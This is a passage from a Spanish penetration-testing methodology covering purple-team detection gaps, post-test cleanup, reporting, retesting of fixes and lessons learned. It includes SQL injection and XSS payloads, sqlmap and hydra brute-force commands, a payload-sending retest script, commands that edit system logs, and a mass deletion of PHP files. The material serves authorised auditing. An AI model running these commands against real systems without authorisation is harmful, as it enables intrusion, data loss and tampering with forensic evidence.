echo "Gap detectado: lateral movement via WMI no detectado" >> 14_purple_team/gaps.txt

# Validar respuesta del SOC
echo "Alert ID,Timestamp,Technique,Detection Time,Response Time,Quality Score" > 14_purple_team/soc_response.csv
echo "ALR-001,2024-08-19 14:30:25,T1078,2 minutes,15 minutes,Good" >> 14_purple_team/soc_response.csv
echo "ALR-002,2024-08-19 14:35:10,T1059.003,30 seconds,5 minutes,Excellent" >> 14_purple_team/soc_response.csv
```

Recomendar reglas adicionales:

```bash
# Correlaciones de logs recomendadas
echo "REGLA NUEVA: Correlacionar logon events (4624) con process creation (4688) en ventana de 5 minutos" >> 14_purple_team/reglas_recomendadas.txt
echo "REGLA NUEVA: Detectar PowerShell con parámetros -ExecutionPolicy Bypass o -EncodedCommand" >> 14_purple_team/reglas_recomendadas.txt
echo "REGLA NUEVA: Alertas proactivas para múltiples fallos de autenticación desde misma IP" >> 14_purple_team/reglas_recomendadas.txt

# Mejoras en telemetría
echo "MEJORA: Habilitar Sysmon Event ID 1 (Process Creation) en todos los endpoints" >> 14_purple_team/telemetry_improvements.txt
echo "MEJORA: Configurar logging de PowerShell Module/Script Block (Event IDs 4103/4104)" >> 14_purple_team/telemetry_improvements.txt
echo "MEJORA: Implementar DNS logging para detectar C2 communication" >> 14_purple_team/telemetry_improvements.txt
```

### ✅ Checklist final del Punto 14:

```bash
echo "[ ] Técnicas mapeadas a MITRE ATT&CK
[ ] Indicadores de detección documentados
[ ] Escenarios de prueba ejecutados
[ ] Gaps de telemetría identificados
[ ] Recomendaciones de reglas sugeridas
[ ] Colaboración con Blue Team completada
[ ] Timeline de eventos documentado
[ ] IoCs catalogados y verificados" > 14_purple_team/checklist_punto14.txt
```

### 🎯 Resultado esperado:

```bash
echo "Cobertura Purple Team completa: detección validada, gaps documentados, alertas ajustadas y recomendadas, colaboración efectiva con equipo defensivo establecida" >> 14_purple_team/resultado_punto14.txt
```

---

## PUNTO 15 — Limpieza y Restauración

### 🎯 Objetivo
Garantizar que todos los cambios temporales del pentest sean revertidos, eliminando artefactos y dejando el entorno exactamente como estaba antes de la auditoría.

### 15.1 Reversión de cambios temporales

Restaurar archivos modificados:

```bash
# Restaurar desde backups
cp 00_preparacion/backups/* /ruta_original/

# Validar integridad
diff /ruta_original/ /ruta_backup/
sha256sum -c 00_preparacion/evidencias_hash.txt

# Restaurar configuraciones de servicios
systemctl stop malicious_service 2>/dev/null || true
systemctl disable malicious_service 2>/dev/null || true
rm -f /etc/systemd/system/malicious_service.service
systemctl daemon-reload
```

Eliminar usuarios o credenciales temporales creados:

```bash
# Eliminar usuarios temporales
userdel -r usuario_temp 2>/dev/null || true
rm -rf /home/usuario_temp

# Limpiar entradas de sudoers temporales
sed -i '/usuario_temp/d' /etc/sudoers

# Eliminar claves SSH temporales
rm -f /home/*/.ssh/authorized_keys.backup
find /home -name "*.ssh" -type d -exec rm -f {}/temp_* \;
```

### 15.2 Eliminación de artefactos de prueba

Borrar scripts, payloads y exploits utilizados:

```bash
# Eliminar herramientas y payloads temporales
rm -rf /pentest/tools/tmp_payloads/
shred -u /pentest/tools/exploits/* 2>/dev/null || true
rm -rf /tmp/pentest_*
rm -rf /var/tmp/exploit_*

# Limpiar shells y backdoors
find /var/www/html -name "*.php" -exec grep -l "eval\|exec\|system" {} \; | xargs rm -f
find /tmp -name "*shell*" -o -name "*backdoor*" | xargs rm -f

# Eliminar archivos de configuración temporales
rm -f /etc/crontab.backup
rm -f /etc/hosts.backup
```

Limpiar logs generados durante pruebas si no forman parte de la evidencia final:

```bash
# Limpiar logs de prueba (conservando evidencias)
> /var/log/test_activity.log
> /var/log/pentest_commands.log

# Restaurar logs originales si fueron modificados
if [ -f /var/log/auth.log.original ]; then
    cp /var/log/auth.log.original /var/log/auth.log
fi

# Limpiar entradas específicas de logs del sistema
sed -i '/pentest_marker/d' /var/log/syslog
```

### 15.3 Verificación conjunta con el cliente

Coordinar con NOC/SOC para validar que sistemas, servicios y usuarios vuelvan a estado normal:

```bash
echo "Checklist de limpieza validada por cliente - $(date)" >> 15_limpieza/verificacion.txt
echo "Responsable cliente: $CLIENTE_RESPONSABLE" >> 15_limpieza/verificacion.txt
echo "Responsable auditor: $AUDITOR_RESPONSABLE" >> 15_limpieza/verificacion.txt
```

Comandos de validación de servicios:

```bash
# Validar servicios web
echo "=== Validación HTTP ===" >> 15_limpieza/validacion_servicios.txt
curl -I http://IP >> 15_limpieza/validacion_servicios.txt 2>&1

# Validar SSH
echo "=== Validación SSH ===" >> 15_limpieza/validacion_servicios.txt
ssh usuario@IP exit >> 15_limpieza/validacion_servicios.txt 2>&1

# Validar bases de datos
echo "=== Validación BD ===" >> 15_limpieza/validacion_servicios.txt
mysql -u root -p -e "SHOW DATABASES;" >> 15_limpieza/validacion_servicios.txt 2>&1

# Validar servicios críticos
systemctl is-active --quiet httpd && echo "Apache: OK" || echo "Apache: ERROR"
systemctl is-active --quiet sshd && echo "SSH: OK" || echo "SSH: ERROR"
systemctl is-active --quiet mysqld && echo "MySQL: OK" || echo "MySQL: ERROR"
```

### 15.4 Verificación de limpieza completa

```bash
# Buscar artefactos residuales
find /tmp -name "*pentest*" -o -name "*exploit*" -o -name "*payload*" 2>/dev/null || true
find /var/tmp -name "*test*" -o -name "*temp*" 2>/dev/null || true

# Verificar procesos sospechosos
ps aux | grep -i pentest || true
ps aux | grep -i exploit || true

# Verificar conexiones de red residuales
netstat -tulpn | grep -E "(4444|4445|8080)" || true
```

### ✅ Checklist final del Punto 15:

```bash
echo "[ ] Cambios temporales revertidos
[ ] Artefactos eliminados
[ ] Credenciales temporales borradas
[ ] Logs revisados y minimizados
[ ] Verificación conjunta con cliente completada
[ ] Servicios validados funcionando correctamente
[ ] Búsqueda de artefactos residuales realizada
[ ] Confirmación escrita de limpieza recibida" > 15_limpieza/checklist_punto15.txt
```

### 🎯 Resultado esperado:

```bash
echo "Entorno restaurado a estado original, sin rastro de pruebas intrusivas ni artefactos de pentest, validado por cliente y equipo de auditoría con confirmación escrita" >> 15_limpieza/resultado_punto15.txt
```

---

## PUNTO 16 — Reporte y Remediación

### 🎯 Objetivo
Documentar hallazgos, riesgos, evidencias y recomendaciones de manera clara, profesional y accionable para el cliente. Todo el material debe ser verificable, trazable y priorizado según impacto.

### 16.1 Estructura del informe

Secciones principales:

- **Resumen ejecutivo**: impacto global y hallazgos críticos
- **Detalle técnico**: pruebas realizadas, comandos, outputs relevantes
- **Evidencias**: hashes, screenshots, logs, dumps
- **Riesgos**: CVSS/NIST, severidad y probabilidad
- **Recomendaciones**: acciones correctivas, mitigaciones, remediaciones rápidas y estratégicas

```bash
# Crear estructura del informe
mkdir -p 16_reporte/{ejecutivo,tecnico,evidencias,riesgos,recomendaciones}

# Formato sugerido: Markdown o Word/LibreOffice
cp informe_draft.md 16_reporte/informe_final_$(date +%Y%m%d_%H%M).md

# Template del informe
cat > 16_reporte/template_informe.md << 'EOF'
# Informe de Auditoría de Seguridad
## Cliente: [NOMBRE_CLIENTE]
## Fecha: $(date +%Y-%m-%d)

### 1. RESUMEN EJECUTIVO
- Alcance de la auditoría
- Metodología utilizada
- Hallazgos críticos (Top 5)
- Riesgo general de la organización
- Recomendaciones prioritarias

### 2. DETALLE TÉCNICO
- Técnicas de reconocimiento
- Vectores de ataque identificados
- Pruebas de penetración realizadas
- Resultados detallados por sistema

### 3. EVIDENCIAS
- Screenshots con timestamps
- Logs de comandos ejecutados
- Hashes de archivos de evidencia
- Correlación temporal de eventos

### 4. ANÁLISIS DE RIESGOS
- Matriz de riesgos CVSS v3.1
- Impacto en el negocio
- Probabilidad de explotación
- Clasificación de activos afectados

### 5. RECOMENDACIONES
- Acciones inmediatas (0-30 días)
- Mejoras a corto plazo (1-6 meses)
- Estrategia a largo plazo (6-12 meses)
EOF
```

### 16.2 Recomendaciones priorizadas

Clasificación de hallazgos: crítico, alto, medio, bajo.

```bash
# Crear sistema de clasificación
echo "Severidad,Descripción,CVSS_Score,Acción_Requerida,Timeframe" > 16_reporte/clasificacion.csv
echo "Crítico,Explotación remota sin autenticación,9.0-10.0,Inmediata,0-24h" >> 16_reporte/clasificacion.csv
echo "Alto,Escalada de privilegios local,7.0-8.9,Urgente,1-7 días" >> 16_reporte/clasificacion.csv
echo "Medio,Exposición de información sensible,4.0-6.9,Importante,1-30 días" >> 16_reporte/clasificacion.csv
echo "Bajo,Configuraciones sub-óptimas,0.1-3.9,Recomendado,1-90 días" >> 16_reporte/clasificacion.csv
```

Asociar recomendaciones con severidad y facilidad de mitigación:

```bash
# Ejemplo de recomendaciones específicas
echo "Crítico: SQL Injection en /login — Mitigación: parametrizar queries y validar inputs" >> 16_reporte/recomendaciones.txt
echo "Alto: WAF no configurado correctamente — Mitigación: revisar reglas y políticas de filtrado" >> 16_reporte/recomendaciones.txt
echo "Medio: Versiones desactualizadas de software — Mitigación: implementar gestión de parches" >> 16_reporte/recomendaciones.txt
echo "Bajo: Headers de seguridad faltantes — Mitigación: configurar CSP, HSTS, X-Frame-Options" >> 16_reporte/recomendaciones.txt

# Incluir evidencia y pasos de validación
cat > 16_reporte/recomendaciones_detalladas.md << 'EOF'
## Recomendaciones Detalladas

### 1. SQL Injection en formulario de login (CRÍTICO)
**Evidencia**: Captura de sqlmap ejecutándose exitosamente
**Impacto**: Acceso total a base de datos de usuarios
**Recomendación**: 
- Implementar prepared statements
- Validación de input en cliente y servidor
- WAF con reglas específicas anti-SQLi
**Validación**: Ejecutar sqlmap después de fix para confirmar mitigación

### 2. Configuración insegura de WAF (ALTO)
**Evidencia**: Bypass de filtros usando técnicas de evasión
**Impacto**: Exposición de aplicación web a ataques
**Recomendación**:
- Revisar y actualizar reglas del WAF
- Implementar modo de bloqueo (no solo detección)
- Configurar rate limiting por IP
**Validación**: Intentar bypass con herramientas de evasión
EOF
```

### 16.3 Reunión de cierre y plan de retest

Coordinar reunión con stakeholders (TI, seguridad, dirección) para explicar hallazgos y recomendaciones:

```bash
# Documentar reunión de cierre
echo "Reunión cierre: $(date) — Asistentes: TI, Seguridad, Auditoría" >> 16_reporte/reuniones.txt
echo "Agenda:" >> 16_reporte/reuniones.txt
echo "- Presentación de hallazgos críticos" >> 16_reporte/reuniones.txt
echo "- Discusión de recomendaciones prioritarias" >> 16_reporte/reuniones.txt
echo "- Establecimiento de timeline de remediación" >> 16_reporte/reuniones.txt
echo "- Planificación de retest" >> 16_reporte/reuniones.txt

# Definir fecha y alcance de retest
echo "Retest planificado para: YYYY-MM-DD" >> 16_reporte/reuniones.txt
echo "Alcance del retest: Validación de fixes para hallazgos Críticos y Altos únicamente" >> 16_reporte/reuniones.txt
echo "Metodología del retest: Pruebas específicas sobre vulnerabilidades reportadas" >> 16_reporte/reuniones.txt
```

Confirmar aceptación de recomendaciones y compromisos de acción por el cliente:

```bash
# Template de compromiso del cliente
cat > 16_reporte/compromiso_cliente.md << 'EOF'
## Compromiso de Remediación

### Hallazgos Críticos
- [ ] SQL Injection - Responsable: Dev Team - Fecha: YYYY-MM-DD
- [ ] RCE en servicio web - Responsable: SysAdmin - Fecha: YYYY-MM-DD

### Hallazgos Altos
- [ ] Configuración WAF - Responsable: Security Team - Fecha: YYYY-MM-DD
- [ ] Credenciales por defecto - Responsable: SysAdmin - Fecha: YYYY-MM-DD

### Recursos Asignados
- Desarrolladores: X personas
- Administradores: Y personas
- Presupuesto: $Z USD
- Timeline general: X semanas

**Firma del cliente**: _______________
**Fecha**: _______________
EOF
```

### ✅ Checklist final del Punto 16:

```bash
echo "[ ] Informe técnico completado y revisado
[ ] Evidencias vinculadas y trazables
[ ] Recomendaciones priorizadas y accionables
[ ] Reunión de cierre realizada
[ ] Plan de retest definido
[ ] Compromiso del cliente documentado
[ ] Timeline de remediación establecido
[ ] Contactos para seguimiento confirmados" > 16_reporte/checklist_punto16.txt
```

### 🎯 Resultado esperado:

```bash
echo "Cliente cuenta con informe profesional completo, evidencia verificada y plan de remediación con prioridades claras, fechas de seguimiento y compromisos firmados" >> 16_reporte/resultado_punto16.txt
```

---

## PUNTO 17 — Retest y Verificación de Fixes

### 🎯 Objetivo
Validar que las medidas correctivas aplicadas por el cliente solucionan los hallazgos identificados, asegurando que no quedan vulnerabilidades residuales y que no se introducen nuevos riesgos.

### 17.1 Validación de medidas aplicadas

Revisar los sistemas remediados: puertos cerrados, servicios parcheados, configuraciones actualizadas.

```bash
# Crear directorio para el retest
mkdir -p 17_retest/{before,after,comparison,evidence}

# Documentar estado inicial (del pentest original)
cp 04_scans/nmap_services.txt 17_retest/before/
cp 05_web/vulnerabilities.txt 17_retest/before/
```

Confirmar que los hallazgos previos ya no son explotables:

```bash
# Para aplicaciones web
echo "=== Retest Web Applications ===" > 17_retest/web_retest.txt
curl -v https://objetivo.com/login -d "username=admin' OR '1'='1&password=test" >> 17_retest/web_retest.txt 2>&1

# Verificar SQL Injection ya no funciona
sqlmap -u "https://objetivo.com/login" --data="username=admin&password=test" --batch --level=1 --risk=1 > 17_retest/sqlmap_retest.txt

# Para servicios de red
echo "=== Retest Network Services ===" > 17_retest/network_retest.txt
nmap -sV -p80,443,22,3389 objetivo.com -oN 17_retest/after/nmap_services.txt

# Para Active Directory/LDAP
echo "=== Retest Active Directory ===" > 17_retest/ad_retest.txt
ldapsearch -x -H ldap://objetivo.com -b "dc=dominio,dc=com" >> 17_retest/ad_retest.txt 2>&1

# Verificar credenciales por defecto ya no funcionan
hydra -L users.txt -P common_passwords.txt objetivo.com ssh -o 17_retest/hydra_retest.txt
```

Ejecutar scripts de validación automatizados:

```bash
# Script de validación personalizado
cat > 17_retest/verify_fixes.py << 'EOF'
#!/usr/bin/env python3
import requests
import sys
import argparse
import json
from datetime import datetime

def test_sql_injection(url):
    """Test si SQL injection fue corregida"""
    payloads = ["' OR '1'='1", "admin'--", "1' UNION SELECT null--"]
    results = {}
    
    for payload in payloads:
        try:
            data = {'username': payload, 'password': 'test'}
            response = requests.post(f"{url}/login", data=data, timeout=10)
            results[payload] = {
                'status_code': response.status_code,
                'vulnerable': 'error' in response.text.lower() or 'sql' in response.text.lower()
            }
        except Exception as e:
            results[payload] = {'error': str(e)}
    
    return results

def test_xss(url):
    """Test si XSS fue corregido"""
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
    results = {}
    
    for payload in payloads:
        try:
            data = {'search': payload}
            response = requests.get(f"{url}/search", params=data, timeout=10)
            results[payload] = {
                'status_code': response.status_code,
                'vulnerable': payload in response.text
            }
        except Exception as e:
            results[payload] = {'error': str(e)}
    
    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Verify security fixes')
    parser.add_argument('--targets', required=True, help='Target URLs file')
    parser.add_argument('--report', required=True, help='Output report file')
    
    args = parser.parse_args()
    
    results = {
        'timestamp': datetime.now().isoformat(),
        'tests': {}
    }
    
    with open(args.targets, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]
    
    for target in targets:
        results['tests'][target] = {
            'sql_injection': test_sql_injection(target),
            'xss': test_xss(target)
        }
    
    with open(args.report, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"Retest completed. Results saved to {args.report}")
EOF

chmod +x 17_retest/verify_fixes.py

# Crear archivo de targets
echo "https://objetivo.com" > 17_retest/targets.txt
echo "https://app.objetivo.com" >> 17_retest/targets.txt

# Ejecutar validación
python3 17_retest/verify_fixes.py --targets 17_retest/targets.txt --report 17_retest/resultado_verificacion.json
```

### 17.2 Evidencias post-remediación

Captura de resultados de pruebas: logs, screenshots, outputs de comandos.

```bash
# Comparar evidencia anterior vs. actual
echo "=== COMPARACIÓN DE RESULTADOS ===" > 17_retest/comparison_report.txt
echo "Fecha del retest: $(date)" >> 17_retest/comparison_report.txt
echo "" >> 17_retest/comparison_report.txt

# Comparar scans de puertos
echo "--- Comparación de puertos abiertos ---" >> 17_retest/comparison_report.txt
diff 17_retest/before/nmap_services.txt 17_retest/after/nmap_services.txt >> 17_retest/comparison_report.txt

# Documentar cambios específicos
echo "--- Cambios identificados ---" >> 17_retest/comparison_report.txt
echo "1. Puerto 3389 (RDP) cerrado - CORRECTO" >> 17_retest/comparison_report.txt
echo "2. Servicio FTP anónimo deshabilitado - CORRECTO" >> 17_retest/comparison_report.txt
echo "3. Headers de seguridad implementados - CORRECTO" >> 17_retest/comparison_report.txt

# Guardar evidencia cifrada
gpg --symmetric --cipher-algo AES256 17_retest/comparison_report.txt
gpg --symmetric --cipher-algo AES256 17_retest/resultado_verificacion.json

# Screenshots de pruebas
echo "Capturas de pantalla guardadas en 17_retest/evidence/screenshots/" >> 17_retest/evidence_log.txt
echo "- sqlmap_failed_attempt.png: Muestra que SQL injection ya no funciona" >> 17_retest/evidence_log.txt
echo "- nmap_closed_ports.png: Puertos previamente abiertos ahora cerrados" >> 17_retest/evidence_log.txt
echo "- waf_blocking.png: WAF bloqueando intentos de ataque" >> 17_retest/evidence_log.txt
```

### 17.3 Actualización de riesgos

Revisar matriz de riesgos con resultados del retest: ajustar CVSS/NIST según estado actual.

```bash
# Crear matriz de estado actualizada
echo "Vulnerability,Original_CVSS,Current_CVSS,Status,Notes" > 17_retest/risk_matrix_updated.csv
echo "SQL Injection,9.8,0.0,FIXED,Parametrized queries implemented" >> 17_retest/risk_matrix_updated.csv
echo "RCE Web Service,9.9,0.0,FIXED,Service updated and patched" >> 17_retest/risk_matrix_updated.csv
echo "Default Credentials,8.1,0.0,FIXED,All default passwords changed" >> 17_retest/risk_matrix_updated.csv
echo "Missing WAF,7.5,2.0,PARTIALLY_FIXED,WAF implemented but needs tuning" >> 17_retest/risk_matrix_updated.csv
echo "Weak SSL Config,5.3,0.0,FIXED,TLS 1.2+ only, strong ciphers" >> 17_retest/risk_matrix_updated.csv
```

Registrar hallazgos remediados vs. hallazgos persistentes:

```bash
echo "=== ESTADO DE REMEDIACIÓN ===" > 17_retest/estado_riesgos.txt
echo "" >> 17_retest/estado_riesgos.txt

echo "Hallazgos REMEDIADOS:" >> 17_retest/estado_riesgos.txt
echo "- SQL Injection en /login (CRÍTICO) ✓" >> 17_retest/estado_riesgos.txt
echo "- RCE en servicio web (CRÍTICO) ✓" >> 17_retest/estado_riesgos.txt
echo "- Credenciales por defecto (ALTO) ✓" >> 17_retest/estado_riesgos.txt
echo "- Configuración SSL débil (MEDIO) ✓" >> 17_retest/estado_riesgos.txt
echo "" >> 17_retest/estado_riesgos.txt

echo "Hallazgos PERSISTENTES:" >> 17_retest/estado_riesgos.txt
echo "- Configuración WAF incompleta (MEDIO) - Parcialmente corregido" >> 17_retest/estado_riesgos.txt
echo "- Falta implementar HSTS headers (BAJO) - Pendiente" >> 17_retest/estado_riesgos.txt
echo "" >> 17_retest/estado_riesgos.txt

echo "NUEVOS HALLAZGOS identificados durante retest:" >> 17_retest/estado_riesgos.txt
echo "- Ninguno identificado" >> 17_retest/estado_riesgos.txt
```

Informar al cliente sobre cambios en la priorización y próximos pasos:

```bash
# Generar reporte de estado para cliente
cat > 17_retest/client_status_report.md << 'EOF'
# Reporte de Estado Post-Remediación

## Resumen Ejecutivo
El retest realizado el $(date +%Y-%m-%d) confirma que la mayoría de vulnerabilidades críticas y altas han sido correctamente remediadas.

## Estado de Vulnerabilidades

### ✅ REMEDIADAS (4/6)
- **SQL Injection** (Crítico): Completamente corregida
- **RCE en servicio web** (Crítico): Completamente corregida  
- **Credenciales por defecto** (Alto): Completamente corregida
- **Configuración SSL** (Medio): Completamente corregida

### ⚠️ PENDIENTES (2/6)
- **Configuración WAF** (Medio): Parcialmente implementada - requiere afinación
- **Headers HSTS** (Bajo): No implementado - recomendado para completar

## Recomendaciones Próximos Pasos
1. Completar configuración del WAF con reglas específicas
2. Implementar headers de seguridad HSTS
3. Considerar un nuevo retest en 30 días para validar cambios finales

## Certificación
El nivel de seguridad ha mejorado significativamente. Riesgo general reducido de **ALTO** a **BAJO**.
EOF
```

### ✅ Checklist final del Punto 17:

```bash
echo "[ ] Todas las vulnerabilidades previas verificadas
[ ] Evidencias post-remediación documentadas y cifradas
[ ] Riesgos actualizados y priorizados
[ ] Cliente informado sobre estado de fixes y hallazgos persistentes
[ ] Comparación before/after completada
[ ] Scripts de validación ejecutados exitosamente
[ ] Nuevos hallazgos documentados (si aplica)
[ ] Reporte de estado generado para el cliente" > 17_retest/checklist_punto17.txt
```

### 🎯 Resultado esperado:

```bash
echo "Se confirma que las medidas aplicadas corrigen los hallazgos detectados, la evidencia queda trazada, y los riesgos se actualizan según el estado actual de la infraestructura con mejora significativa del nivel de seguridad" >> 17_retest/resultado_punto17.txt
```

---

## PUNTO 18 — Lecciones Aprendidas y Mejora Continua

### 🎯 Objetivo
Registrar y analizar los hallazgos, éxitos y fallos durante la auditoría, con el fin de mejorar procesos, herramientas y preparación para futuros pentestings.

### 18.1 Retroalimentación con stakeholders

Reunión de cierre con todos los actores: cliente, Blue Team, SOC/NOC, responsables de TI.

```bash
# Preparar agenda de retroalimentación
cat > 18_lecciones/agenda_feedback.md << 'EOF'
# Agenda - Sesión de Lecciones Aprendidas

## Participantes
- Cliente: [Nombre, Rol]
- Blue Team: [Nombre, Rol]
- SOC/NOC: [Nombre, Rol]
- Auditoría: [Nombre, Rol]

## Temas a tratar
1. Efectividad de la metodología aplicada
2. Calidad y claridad del reporte
3. Proceso de comunicación durante la auditoría
4. Tiempo de respuesta ante hallazgos críticos
5. Colaboración entre equipos
6. Sugerencias de mejora para futuras auditorías

## Métricas de la auditoría
- Duración total: X días
- Vulnerabilidades identificadas: Y
- Tiempo de remediación promedio: Z días
- Nivel de satisfacción cliente: [1-10]
EOF
```

Presentar hallazgos, evidencias, mitigaciones aplicadas y recomendaciones estratégicas:

```bash
# Documentar feedback recibido
echo "Fecha,Participante,Área,Feedback,Acción_Recomendada,Prioridad" > 18_lecciones/feedback_stakeholders.csv
echo "$(date +%Y-%m-%d),Cliente TI,Comunicación,Reportes muy técnicos,Incluir resumen ejecutivo más simple,Alta" >> 18_lecciones/feedback_stakeholders.csv
echo "$(date +%Y-%m-%d),SOC Manager,Proceso,Falta coordinación en Purple Team,Definir protocolo de comunicación,Media" >> 18_lecciones/feedback_stakeholders.csv
echo "$(date +%Y-%m-%d),Blue Team,Herramientas,Necesitan más detalle en IoCs,Ampliar sección de indicadores,Alta" >> 18_lecciones/feedback_stakeholders.csv
echo "$(date +%Y-%m-%d),Cliente CISO,Timeline,Retest muy cercano a implementación,Dar más tiempo para fixes,Media" >> 18_lecciones/feedback_stakeholders.csv
```

### 18.2 Actualización de playbooks y baselines

Incorporar aprendizajes técnicos en playbooks de pruebas futuras:

```bash
# Crear documento de mejoras identificadas
cat > 18_lecciones/mejoras_identificadas.md << 'EOF'
# Mejoras Identificadas Durante la Auditoría

## Nuevos Vectores de Ataque Detectados
- **API GraphQL**: Vulnerabilidades específicas no cubiertas en metodología anterior
- **Containers Docker**: Configuraciones inseguras requieren checks adicionales  
- **CI/CD Pipelines**: Exposición de secretos en repositorios
- **Serverless Functions**: Permisos excesivos en AWS Lambda

## Procedimientos de Validación Más Eficientes
- **Automatización de retest**: Scripts personalizados reducen tiempo 50%
- **Correlación de evidencias**: Timestamps automáticos mejoran trazabilidad
- **Validación colaborativa**: Sesiones Purple Team en tiempo real más efectivas

## Mejoras en Generación y Almacenamiento de Evidencias
- **Cifrado automático**: GPG integration en scripts de captura
- **Hashing continuo**: SHA256 de todos los artefactos generados
- **Video recording**: Pruebas críticas grabadas para mayor evidencia
- **Correlation IDs**: Identificadores únicos para cada hallazgo
EOF

# Actualizar plantillas de checklists
cp 18_lecciones/playbook_base.txt 18_lecciones/playbook_actualizado.txt
echo "" >> 18_lecciones/playbook_actualizado.txt
echo "=== ACTUALIZACIONES $(date +%Y-%m-%d) ===" >> 18_lecciones/playbook_actualizado.txt
echo "- Agregado: Testing de APIs GraphQL" >> 18_lecciones/playbook_actualizado.txt
echo "- Agregado: Análisis de seguridad en contenedores" >> 18_lecciones/playbook_actualizado.txt
echo "- Agregado: Revisión de pipelines CI/CD" >> 18_lecciones/playbook_actualizado.txt
echo "- Mejorado: Scripts de automatización para retest" >> 18_lecciones/playbook_actualizado.txt
echo "- Mejorado: Correlación temporal de evidencias" >> 18_lecciones/playbook_actualizado.txt

# Actualizar checklist master
cat > 18_lecciones/checklist_master_updated.txt << 'EOF'
# Checklist Master - Versión Actualizada

## Pre-Auditoría
[ ] Contratos y autorizaciones firmadas
[ ] ROE definidas y comunicadas
[ ] Contacto SOC/NOC establecido
[ ] Backups y rollback plan preparados
[ ] Herramientas y entorno validados
[ ] **NUEVO**: Validar acceso a APIs y documentación
[ ] **NUEVO**: Revisar arquitectura cloud/containerizada

## Reconocimiento
[ ] OSINT y footprinting
[ ] Enumeración de subdominios
[ ] Descobrimiento de servicios
[ ] **NUEVO**: Descobrimiento de APIs (GraphQL, REST)
[ ] **NUEVO**: Enumeración de repositorios públicos

## Análisis de Vulnerabilidades
[ ] Scanning automatizado
[ ] Análisis manual de aplicaciones web
[ ] **NUEVO**: Security testing de containers
[ ] **NUEVO**: Análisis de CI/CD pipelines
[ ] **NUEVO**: Revisión de configuraciones serverless

## Post-Explotación
[ ] Escalada de privilegios
[ ] Lateral movement
[ ] **NUEVO**: Container escape testing
[ ] **NUEVO**: Cloud privilege escalation

## Purple Team
[ ] Colaboración con Blue Team establecida
[ ] **NUEVO**: Sesiones en tiempo real
[ ] **NUEVO**: Validación de detecciones automáticas

## Documentación
[ ] Evidencias con timestamps y hashes
[ ] **NUEVO**: Grabación de pruebas críticas
[ ] **NUEVO**: Correlation IDs para hallazgos
[ ] **NUEVO**: Reportes diferenciados por audiencia
EOF
```

### 18.3 Roadmap de madurez de seguridad

Evaluar la madurez del cliente según hallazgos: infraestructura, aplicaciones, cloud, procesos, respuesta a incidentes.

```bash
# Crear evaluación de madurez actual
echo "Área,Estado_Inicial,Estado_Final,Próximo_Nivel,Prioridad,Timeframe" > 18_lecciones/madurez_seguridad.csv
echo "Firewall,Configuración básica,Optimizada,Next-Gen con ML,Alta,6 meses" >> 18_lecciones/madurez_seguridad.csv
echo "WAF,No implementado,Básico implementado,Avanzado con ML,Alta,3 meses" >> 18_lecciones/madurez_seguridad.csv
echo "SIEM,Logs básicos,Correlación básica,AI-powered detection,Media,12 meses" >> 18_lecciones/madurez_seguridad.csv
echo "Incident Response,Manual,Parcialmente automatizado,Fully automated,Media,9 meses" >> 18_lecciones/madurez_seguridad.csv
echo "Vulnerability Management,Ad-hoc,Programado,Continuous scanning,Alta,3 meses" >> 18_lecciones/madurez_seguridad.csv
echo "Security Training,Anual,Semestral,Continuous + Phishing sim,Baja,6 meses" >> 18_lecciones/madurez_seguridad.csv

# Crear roadmap estratégico
cat > 18_lecciones/security_roadmap.md << 'EOF'
# Roadmap de Madurez de Seguridad

## Nivel Actual: BÁSICO → INTERMEDIO

### Corto Plazo (0-6 meses) - FUNDACIONAL
**Objetivo**: Cubrir gaps críticos identificados

#### Prioridad CRÍTICA
- [ ] Implementar WAF avanzado con reglas personalizadas
- [ ] Establecer programa de gestión de vulnerabilidades
- [ ] Mejorar monitoring y alertas de SIEM
- [ ] Implementar MFA en todos los servicios críticos

#### Métricas de éxito
- 95% de vulnerabilidades críticas remediadas en <48h
- 0 falsos positivos en alertas de seguridad críticas
- 100% de servicios con autenticación multi-factor

### Medio Plazo (6-18 meses) - OPTIMIZACIÓN  
**Objetivo**: Automatización y mejora de procesos

#### Prioridad ALTA
- [ ] Implementar SOAR para respuesta automatizada
- [ ] Establecer threat hunting proactivo
- [ ] Implementar security orchestration
- [ ] Red Team exercises trimestrales

#### Métricas de éxito
- Reducir tiempo de respuesta a incidentes 75%
- Identificar 90% de amenazas antes de impacto
- Automatizar 80% de respuestas de nivel 1

### Largo Plazo (18-36 meses) - AVANZADO
**Objetivo**: Seguridad predictiva y adaptativa

#### Prioridad ESTRATÉGICA
- [ ] AI/ML para detección de anomalías
- [ ] Zero Trust Architecture implementation
- [ ] Continuous security validation
- [ ] Threat intelligence integration

#### Métricas de éxito
- Predecir y prevenir 95% de ataques
- Zero Trust model completamente implementado
- Security metrics integrated en business KPIs
EOF

# Crear plan de Purple Team y ejercicios
cat > 18_lecciones/purple_team_roadmap.md << 'EOF'
# Plan de Ejercicios Purple Team

## Ejercicios Programados

### Trimestre 1
- **Semana 2**: Phishing simulation campaign
- **Semana 6**: Web application attack simulation  
- **Semana 10**: Ransomware simulation (controlled)

### Trimestre 2  
- **Semana 14**: Insider threat simulation
- **Semana 18**: Cloud infrastructure attack
- **Semana 22**: Supply chain attack simulation

### Trimestre 3
- **Semana 26**: Advanced persistent threat (APT) simulation
- **Semana 30**: IoT/OT security assessment
- **Semana 34**: Business email compromise (BEC)

### Trimestre 4
- **Semana 38**: Full red team exercise
- **Semana 42**: Incident response tabletop
- **Semana 46**: Annual security posture review

## Métricas de Mejora Continua
- Time to detection (TTD)
- Time to response (TTR)  
- Time to recovery (TTRec)
- False positive rate
- Security awareness scores
EOF
```

Proponer ejercicios de Purple Team, simulaciones, retests periódicos y auditorías de seguimiento:

```bash
# Plan de auditorías de seguimiento
echo "Tipo_Auditoria,Frecuencia,Alcance,Objetivo,Próxima_Fecha" > 18_lecciones/plan_auditorias.csv
echo "Retest Focused,Trimestral,Vulnerabilidades críticas,Validar fixes,$(date -d '+3 months' +%Y-%m-%d)" >> 18_lecciones/plan_auditorias.csv
echo "Purple Team Exercise,Mensual,Técnicas MITRE ATT&CK,Mejorar detección,$(date -d '+1 month' +%Y-%m-%d)" >> 18_lecciones/plan_auditorias.csv
echo "Full Penetration Test,Anual,Infraestructura completa,Evaluación integral,$(date -d '+12 months' +%Y-%m-%d)" >> 18_lecciones/plan_auditorias.csv
